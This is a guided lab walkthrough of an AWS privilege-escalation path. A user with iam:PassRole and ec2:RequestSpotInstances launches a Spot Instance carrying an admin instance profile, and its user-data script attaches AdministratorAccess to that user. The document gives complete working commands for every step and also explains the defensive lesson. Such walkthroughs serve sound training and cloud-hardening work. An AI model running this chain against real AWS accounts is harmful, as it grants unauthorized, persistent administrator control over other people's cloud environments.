# Guided Walkthrough: One-Hop Privilege Escalation via iam:PassRole + ec2:RequestSpotInstances

This scenario demonstrates a privilege escalation vulnerability where a user has permission to pass IAM roles to EC2 Spot Instances (`iam:PassRole`) and request EC2 Spot Instances (`ec2:RequestSpotInstances`). The attacker, starting with these permissions, launches an EC2 Spot Instance with an administrative instance profile, and uses the instance's user-data script to attach the AdministratorAccess managed policy directly to the starting user. Once the policy is attached, the attacker gains full administrator access.

EC2 Spot Instances are spare compute capacity available at significantly discounted rates (up to 90% off On-Demand prices). While this makes them cost-effective for attackers executing privilege escalation, the underlying security vulnerability is identical to the standard `ec2:RunInstances` technique. Security teams must understand that restricting `ec2:RunInstances` alone is insufficient — they must also restrict `ec2:RequestSpotInstances` to prevent the same attack vector.

This technique is particularly dangerous because it combines IAM permissions with compute service actions, allowing an attacker to leverage temporary, low-cost compute resources to modify persistent IAM configurations. Even though this involves multiple AWS API calls (PassRole, RequestSpotInstances, AttachUserPolicy), it's classified as one-hop because there is only one principal traversal: from the starting user to admin privileges via the Spot Instance as an intermediary mechanism.

## The Challenge

You start as `pl-prod-ec2-004-to-admin-starting-user`, an IAM user with two key permissions:
- `iam:PassRole` scoped to `arn:aws:iam::*:role/pl-prod-ec2-004-to-admin-target-role`
- `ec2:RequestSpotInstances` on all resources

Your goal is to escalate to full administrator access using these permissions. The `pl-prod-ec2-004-to-admin-target-role` is an administrative role that trusts `ec2.amazonaws.com`, meaning it can be attached to an EC2 instance via an instance profile. The trick is getting that role's credentials to do your bidding — and user-data scripts run on first boot with access to exactly those credentials.

Credentials for `pl-prod-ec2-004-to-admin-starting-user` are available from Terraform outputs.

## Reconnaissance

First, let's confirm your identity and verify the limited starting permissions:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<account_id>:user/pl-prod-ec2-004-to-admin-starting-user
```

Confirm you can't yet list IAM users (no admin access):

```bash
aws iam list-users --max-items 1
# An error occurred (AccessDenied) when calling the ListUsers operation
```

Good. Now discover what you have to work with. Find the instance profile that wraps the admin role:

```bash
aws iam list-instance-profiles \
  --query 'InstanceProfiles[?contains(InstanceProfileName, `ec2-004`)].{Name:InstanceProfileName, Arn:Arn}'
```

This reveals `pl-prod-ec2-004-to-admin-instance-profile`. You can also confirm the role attached to it carries administrative permissions:

```bash
aws iam list-roles \
  --query 'Roles[?contains(RoleName, `ec2-004`)].{Name:RoleName, Arn:Arn}'
```

Grab your account ID and look up a suitable AMI and subnet for the instance launch:

```bash
# Get account ID
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)

# Find a current Amazon Linux 2023 AMI
AMI_ID=$(aws ec2 describe-images \
    --owners amazon \
    --filters "Name=name,Values=al2023-ami-2023.*-x86_64" "Name=state,Values=available" \
    --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
    --output text)

# Find the default VPC subnet
DEFAULT_VPC=$(aws ec2 describe-vpcs \
    --filters "Name=is-default,Values=true" \
    --query 'Vpcs[0].VpcId' --output text)

DEFAULT_SUBNET=$(aws ec2 describe-subnets \
    --filters "Name=vpc-id,Values=$DEFAULT_VPC" \
    --query 'Subnets[0].SubnetId' --output text)
```

## Exploitation

The key insight: if you can request a Spot Instance with an admin instance profile, and you control the user-data script that runs at boot, you can use the admin role's credentials to modify your own IAM permissions — all without ever directly assuming the role.

### Step 1: Craft the user-data backdoor

Write a script that attaches `AdministratorAccess` to your starting user. This script will execute at instance boot time using the credentials of the admin role attached to the instance profile:

```bash
STARTING_USER="pl-prod-ec2-004-to-admin-starting-user"

USER_DATA=$(cat <<EOF
#!/bin/bash
exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1
echo "Starting privilege escalation script..."

# Wait for IAM role to be available via IMDS
sleep 15

# Attach AdministratorAccess policy to the starting user
aws iam attach-user-policy \
  --user-name ${STARTING_USER} \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

echo "AdministratorAccess attached successfully"
EOF
)

USER_DATA_B64=$(echo "$USER_DATA" | base64 | tr -d '\n')
```

### Step 2: Build the launch specification

Spot Instances require a launch specification JSON rather than individual flags:

```bash
INSTANCE_PROFILE="pl-prod-ec2-004-to-admin-instance-profile"

LAUNCH_SPEC=$(cat <<EOF
{
  "ImageId": "$AMI_ID",
  "InstanceType": "t3.micro",
  "IamInstanceProfile": {
    "Name": "$INSTANCE_PROFILE"
  },
  "UserData": "$USER_DATA_B64",
  "NetworkInterfaces": [
    {
      "DeviceIndex": 0,
      "SubnetId": "$DEFAULT_SUBNET",
      "AssociatePublicIpAddress": true
    }
  ]
}
EOF
)
```

### Step 3: Request the Spot Instance

This is the critical API call — `ec2:RequestSpotInstances` combined with `iam:PassRole`. You pass the admin instance profile to the Spot Instance, and AWS will launch it when capacity is available:

```bash
SPOT_OUTPUT=$(aws ec2 request-spot-instances \
    --spot-price "0.05" \
    --instance-count 1 \
    --type "one-time" \
    --launch-specification "$LAUNCH_SPEC" \
    --output json)

SPOT_REQUEST_ID=$(echo "$SPOT_OUTPUT" | jq -r '.SpotInstanceRequests[0].SpotInstanceRequestId')
echo "Spot Request ID: $SPOT_REQUEST_ID"
```

### Step 4: Wait for fulfillment

Poll until the Spot Instance is running. Spot requests are typically fulfilled within 1-2 minutes:

```bash
while true; do
    STATUS=$(aws ec2 describe-spot-instance-requests \
        --spot-instance-request-ids "$SPOT_REQUEST_ID" \
        --query 'SpotInstanceRequests[0].{State:State,Code:Status.Code,InstanceId:InstanceId}' \
        --output json)

    STATE=$(echo "$STATUS" | jq -r '.State')
    if [ "$STATE" = "active" ]; then
        INSTANCE_ID=$(echo "$STATUS" | jq -r '.InstanceId')
        echo "Instance launched: $INSTANCE_ID"
        break
    fi
    echo -n "."
    sleep 10
done
```

### Step 5: Wait for the user-data script to run

Once the instance is launched, wait for it to boot and execute the user-data script. Poll IAM for the policy attachment — this typically completes within 2-3 minutes:

```bash
while true; do
    POLICY=$(aws iam list-attached-user-policies \
        --user-name "$STARTING_USER" \
        --query 'AttachedPolicies[?PolicyName==`AdministratorAccess`].PolicyName' \
        --output text 2>/dev/null)

    if [ "$POLICY" = "AdministratorAccess" ]; then
        echo "AdministratorAccess attached!"
        break
    fi
    echo -n "."
    sleep 10
done
```

## Verification

Now verify that your starting user has administrator access:

```bash
# Re-export starting user credentials
export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
unset AWS_SESSION_TOKEN

# List IAM users — this requires admin access
aws iam list-users --max-items 3 --output table
```

If the table renders successfully, the escalation is complete. You went from a user who couldn't even list IAM users to one who can call any AWS API.

## What Happened

The attack exploited two permissions that are rarely considered dangerous on their own: the ability to pass a role to EC2 and the ability to request Spot Instances. Together, they form a complete privilege escalation path.

The Spot Instance acted as an intermediary: it booted with the admin role's credentials available via IMDS, and the user-data script used those credentials to permanently modify the starting user's IAM policies. The instance was ephemeral — it only needed to exist long enough to run the backdoor — but the IAM change it made is persistent.

This is identical in effect to the `ec2:RunInstances` escalation path (ec2-001), which is why "deny RunInstances" is an incomplete defense. Any API that can launch compute with an attached IAM role and user-data support can be exploited the same way. Security policies must explicitly restrict `ec2:RequestSpotInstances` alongside `ec2:RunInstances` to close this gap.
